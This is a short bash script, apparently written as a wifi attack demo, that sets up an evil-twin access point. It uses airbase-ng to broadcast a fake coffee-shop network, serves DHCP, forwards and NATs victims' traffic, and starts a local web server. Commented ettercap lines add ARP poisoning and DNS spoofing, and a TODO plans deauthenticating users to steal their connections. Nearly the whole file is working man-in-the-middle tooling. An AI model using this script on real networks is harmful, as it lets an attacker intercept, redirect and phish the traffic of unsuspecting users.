#!/bin/bash

######################################################################################

# Author: Alex Walker
#Script to demo some attacks that could be done using wifi.
#TODO: deauth a user and take their connection by copying their SSID

######################################################################################

airmon-ng start wlan1

#    Figure out what your monitor interface is, Chances are its mon0:
ifconfig -a
gnome-terminal -x airbase-ng -P -e "notSofriendlyCoffeeShop" mon0 & #open in new window

#    Find out what the AP interface is (normally starts with "at"):
sleep 5
ifconfig -a

#Start the external interface
ifconfig at0 up 192.168.121.1 netmask 255.255.255.0

#start the dhcp server
service isc-dhcp-server start

iptables -t nat -A POSTROUTING -o wlan0 -s 192.168.121.0/24 -j MASQUERADE
#forward connections
echo 1 > /proc/sys/net/ipv4/ip_forward

sleep 2

/opt/lampp/lampp restart
#ettercap -T -q -i at0 -P dns_spoof -M arp // //

#sudo nano /usr/share/ettercap/etter.dns 
